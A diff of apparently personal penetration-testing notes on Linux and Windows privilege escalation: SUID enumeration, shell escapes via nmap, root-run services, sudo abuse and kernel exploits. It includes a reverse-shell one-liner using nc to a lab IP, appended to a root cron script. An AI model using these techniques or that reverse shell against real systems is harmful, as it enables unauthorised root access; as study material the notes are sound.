@@ -117,6 +117,7 @@ For example, we could name our executable Program.exe and place it in C:\Program
 or subdirectory (C:\Program Files\My Program\My service)
 
 ## Windows kernel vuln
+Use this when not other option left!
 * Anayse first system: ``systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"``
 * As such, we should always attempt to investigate this attack surface first before resorting to more difficult attacks ``driverquery /v``, check 3rd party drivers (even if it marks at stopeed because it is loaded in the memory kernel space)
 * we can check searchsploit for driver but check version, drivers, etc.
@@ -140,4 +141,26 @@ Jan27 18:00:01 victim CRON[2671]:(root) CMD (cd /var/scripts/ && ./user_backups.
 * Since an unprivileged user can modify the contents of the backup script, we can edit it and add a reverse shell one-liner ``echo >> user_backup.sh`` && ``echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f" >> user_backups.sh``
 * Open nc reverese shell in kali => and once this CJ runs we should have root acccess shell
 
+## Exploiting services which are running as root
+*Exploiting any service which is running as root will give you Root!* Example MySQL
 
+* ``netstat -antup`` – It shows you all the ports which are open and are listening. We can check for services which are running locally if they could be exploited or not.
+* `ps -aux | grep root` – It shows us the services which are running as root.
+* One of the biggest mistake web admins do, is to run a webserver with root privilege. A command injection vulnerability on the web application can lead an attacker to root shell. This is a classic example of why you should never run any service as root unless really required.
+*Never run any service as root unless really required, especially web, database and file servers.*
+
+## Exploiting SUID Executables
+SUID which stands for set user ID, is a Linux feature that allows users to execute a file with the permissions of a specified user. For example, the Linux ping command typically requires root permissions in order to open raw network sockets. By marking the ping program as SUID with the owner as root, ping executes with root privileges anytime a low privilege user executes the program.
+
+* when `ls -la` a file you might see `rwsr-xr-x–` The *‘s’* character instead of ‘x’ indicates that the SUID bit is set
+* `find / -perm -u=s -type f 2>/dev/null`- It prints the executables which have SUID bit set
+* For example if nmap or python is enabled we might get root `nmap –interactive` – runs nmap interactive mode
+
+    SUID bit should not be set to any program which lets you escape to the shell.
+    You should never set SUID bit on any file editor/compiler/interpreter as an attacker can easily read/overwrite any files present on the system.
+
+## Exploiting SUDO rights/user
+If the attacker can’t directly get root access via any other techniques he might try to compromise any of the users who have SUDO access
+
+## Kernel exploits 
+use this if other things not possible
